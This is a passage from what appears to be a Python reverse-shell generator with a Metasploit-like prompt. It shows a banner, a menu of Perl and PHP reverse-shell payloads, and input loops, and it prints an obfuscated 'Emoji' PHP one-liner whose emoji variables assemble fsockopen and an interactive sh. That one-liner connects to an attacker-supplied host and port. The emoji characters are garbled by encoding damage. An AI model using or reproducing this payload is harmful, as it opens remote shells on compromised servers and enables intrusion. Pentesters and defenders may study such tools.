...
/_/  \__/|___/\__/_/ /___/\__/__/___/_//_/\__/_/_/___/
                            /___/                     
1# revsreshell/Perl
2# revsreshell/Perl/no_sh
3# revsreshell/Perl/PentestMonkey
4# revsreshell/PHP/Emoji
5# revsreshell/PHP/PentestMonkey
6# revsreshell/PHP/Ivan/Sincek
7# revsreshell/PHP/cmd
8# revsreshell/PHP/exec
9# revsreshell/PHP/shell_exec
10# revsreshell/PHP/system
...
while True:  
    try:
        exin = input("\033[1;32msmf \033[1;34m(\033[1;31mrevsreshell/PHP/Emoji\033[1;34m)> \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mrevsreshell/PHP/Emoji\033[1;31m)> \033[1;32m")
...
time.sleep(1)
php = f"""
php -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "{LHOST}";$ð» = {LPORT};$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);'
"""
print(php)
